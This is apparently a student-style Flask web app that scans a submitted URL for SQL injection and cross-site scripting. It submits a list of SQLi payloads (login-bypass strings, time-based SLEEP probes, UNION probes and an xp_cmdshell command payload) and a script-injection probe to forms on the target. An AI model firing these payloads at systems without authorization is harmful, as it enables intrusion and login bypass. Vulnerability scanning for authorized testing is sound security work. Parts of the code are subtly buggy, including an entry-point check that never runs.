from flask import Flask, request, render_template
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import time

sql_vulnarr=[]
app = Flask(__name__)
sql_vuln=[[],[],[],[]]

@app.route("/", methods=["GET", "POST"])
def index():
    url = None  # Initialize url as None

    if request.method == "POST":
        url = request.form.get("url")
        scan(url)

        return render_template("results.html",results=sql_vuln)

        # You can also perform vulnerability analysis here if needed

    return render_template("index.html", url=url)  # Pass 'url' to the template

def scan(url):
    scan_sql_injection(url)
    scan_xss(url)

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

def get_all_forms(url):
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None

    method = form.attrs.get("method", "get").lower()

    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def xssget_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action", "").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details
def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)
def scan_xss(url):
    # get all the forms from the URL
            forms = get_all_forms(url)
            print(f"[+] Detected {len(forms)} forms on {url}.")
            js_script = "<Script>alert('hi')</scripT>"
            # returning value
            is_vulnerable = False
            # iterate over all forms
            flag=0
            for form in forms:
                form_details = xssget_form_details(form)
                content = submit_form(form_details, url, js_script).content.decode()
                if js_script in content:
                    flag=1
                    print(f"[+] XSS Detected on {url}")
                    sql_vuln[3].append("Found(<Script>alert('hi')</scripT>)")
                    print(f"[*] Form details:")
                    print(form_details)
                    is_vulnerable = True
            if flag==0:
                sql_vuln[3].append("Not Found")
            return is_vulnerable
def is_vulnerable(response):


    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }

    for error in errors:
        if error in response.content.decode().lower():
            return True

    return False

def scan_sql_injection(url):

    print("\n[!] Testing SQLi")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(2)'

    time1 = time.time()
    req = requests.get(urlb)
    time2 = time.time()
    timet = time2 - time1
    timet = str(timet)
    timet = timet.split(".")
    timet = timet[0]
    if int(timet) >= 2:
        print("[*] Blind SQL injection time based found!")
        print("[!] Payload:", '1-SLEEP(2)')
        print("[!] POC:", urlb)
        sql_vuln[2].append("Found([*] Blind SQL injection time based found!)")
    else:
        print("[!] SQL time based failed.")
        sql_vuln[2].append("Not Found")
    login_url=url
    payloads = [
        "'OR 1-- -",
        "",  # Add an empty payload for testing the original request
        "'",
        "\"",
        "' OR 1=1 --",
        "\" OR 1=1 --",
        "admin' or '1'='1",
        "adm' or '1'='1",
        "' UNION SELECT null --",
        "\" UNION SELECT null --",
        "' OR IF(1=1, SLEEP(5), 0) --",  # Time-based blind SQL injection
        "\" OR IF(1=1, SLEEP(5), 0) --",  # Time-based blind SQL injection
        "' OR 1=1 --",  # Boolean-based blind SQL injection
        "\" OR 1=1 --",  # Boolean-based blind SQL injection
        "'; EXEC xp_cmdshell('nslookup example.com') --",  # Out-of-Band SQL injection
        "' AND 1=CONVERT(int, (SELECT @@version)) --",  # Error-Based SQL injection
        "\" AND 1=CONVERT(int, (SELECT @@version)) --",  # Error-Based SQL injection
        "' OR '1'='1",  # Blind SQL injection for Login Bypass
        "\" OR \"1\"=\"1",  # Blind SQL injection for Login Bypass
    ]
    flag=0
    for i in payloads:
        print(i)
        # Define the login credentials
        username = "\"" + i + "\""
        password = "\"" + i + "\""

        # Create a session to maintain cookies
        session = requests.Session()

        # Send a GET request to the login page to retrieve any necessary cookies or tokens
        response = session.get(login_url)

        # Check if the login page was loaded successfully (you may need to adjust this check)
        if response.status_code == 200:
            print("Successfully loaded the login page.")
        else:
            print("Failed to load the login page.")

        # Define the POST data with your login credentials
        login_data = {
            "username": username,
            "password": password,
            # Add any additional fields as needed based on the form
        }

        # Send a POST request to log in
        login_response = session.post(login_url, data=login_data)

        # Check if the login was successful (you may need to adjust this check)

        if ("Sign Out" in login_response.text or "Logout" in login_response.text) and login_response.status_code == 200:
            print("vulnerable")
            flag=1
            sql_vuln[0].append("Found("+i+")")
    if flag==0:
            sql_vuln[0].append("Not Found")


    print(sql_vuln)
    flag=0
    for c in "\"'":
        new_url = f"{url}{c}"

        print("Trying to find vulnerability on ", new_url)

        res = s.get(new_url)

        if is_vulnerable(res):
            print("SQL Injection vulnerability detected, link:", new_url)
            flag=1
            sql_vuln[1].append("Found("+new_url+")")




    forms = get_all_forms(url)
    print(f"Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{c}"

            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)

            if is_vulnerable(res):
                print("SQL Injection vulnerability detected, link:", url)
                flag=1
                sql_vuln[1].append("Found("+new_url+")")
                print("Form:")
                print(form_details)
                break
    if flag==0:
        sql_vuln[1].append("Not Found")

if __name__ == "main":
    app.run(debug=True)